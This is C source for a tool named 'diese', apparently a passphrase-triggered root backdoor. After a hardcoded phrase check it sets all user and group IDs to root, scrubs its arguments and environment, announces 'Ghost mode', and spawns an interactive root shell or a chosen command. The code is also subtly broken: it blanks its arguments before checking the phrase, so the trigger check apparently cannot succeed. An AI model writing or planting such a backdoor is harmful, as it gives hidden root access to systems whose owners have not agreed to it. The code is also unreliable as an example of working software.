#define TRIGGER "diese1337"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#ifdef __linux__
#include <sys/prctl.h>
#elif defined(__FreeBSD__)
#include <sys/procctl.h>
#endif

static void wipe_env(void) {
    clearenv();
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
}

int main(int argc, char **argv) {
#ifdef __linux__
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
#elif defined(__FreeBSD__)
    int no_new = PROC_NO_NEW_PRIVS_ENABLE;
    procctl(P_PID, 0, PROC_NO_NEW_PRIVS_CTL, &no_new);
#endif

    for (int i = 1; i < argc; i++) memset(argv[i], 0, strlen(argv[i]));

    if (geteuid() != 0) {
        fprintf(stderr, "\033[31m[!] diese: root required\033[0m\n");
        return 1;
    }

    if (argc < 2 || strcmp(argv[1], TRIGGER) != 0) {
        fprintf(stderr, "\033[31m[!] diese: wrong phrase\033[0m\n");
        return 1;
    }

    wipe_env();

    if (setresuid(0,0,0) != 0 || setresgid(0,0,0) != 0) {
        perror("setres");
        return 1;
    }

    printf("\033[31m[diese v3.4] uid=0 gid=0 context=locked | trigger OK\033[0m\n");
    printf("[*] Ghost mode active.\n\n");

    if (argc > 2) {
        execvp(argv[2], &argv[2]);
    } else {
        execl("/bin/sh", "/bin/sh", "-i", NULL);
    }
    return 1;
}
